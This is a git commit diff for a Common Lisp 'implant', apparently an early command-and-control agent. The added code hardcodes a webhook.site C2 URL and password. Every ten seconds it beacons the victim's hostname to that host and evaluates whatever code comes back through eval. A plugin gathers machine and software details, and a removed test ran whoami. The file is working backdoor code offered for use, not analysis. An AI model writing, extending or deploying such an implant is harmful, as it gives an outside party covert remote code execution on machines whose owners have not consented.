5e07ec728ff66eefc7341b3296f0927c5053f880
Nik Swap <nikswap@local.host>
2023-12-27 15:07:17 +0100

    Added first steps of lisp implant

--- lisp/implant/main.lisp
+++ lisp/implant/main.lisp
@@ -1,5 +1,9 @@
 (require :sb-bsd-sockets)
 (use-package :sb-bsd-sockets)
+(ql:quickload :drakma)
+
+(defparameter *c2host* "https://webhook.site/568cf95e-0f99-413e-8326-6d493e013557")
+(defparameter *c2password* "secret")
 
 (defun get-hostname ()
   (machine-instance))
@@ -17,11 +21,20 @@
   (eval (read-from-string code)))
 
 (defun download-plugin (url)
-  )
+  (format t "Fetching from: ~a~%" url))
 
 (defun heartbeat ()
-  )
+  (let ((resposnse (drakma:http-request *c2host*
+                         :method :post 
+                         :parameters (pairlis '("client_password" "implantname") (list *c2password* (get-hostname))))
+                                       ))
+    (format t "~a~%" resposnse)
+    (run-plugin resposnse)))
 
-;; Remove the test function in production
-(defun test ()
-  (run-plugin "(sb-ext:run-program \"/usr/bin/whoami\" () :output t)"))
+(defun runner ()
+  (loop
+    (heartbeat)
+    (sleep 10)))
+
+(runner)
+
--- lisp/plugins/systeminfo.lisp
+++ lisp/plugins/systeminfo.lisp
@@ -1,4 +1,1 @@
-(defun run-this ()
-  (format t "~a~%" (list (machine-instance) (machine-type) (machine-version) (software-type) (software-version))))
-
-(run-this)
+(defun run-this ()(format t "~a~%" (list (machine-instance) (machine-type) (machine-version) (software-type) (software-version))))(run-this)
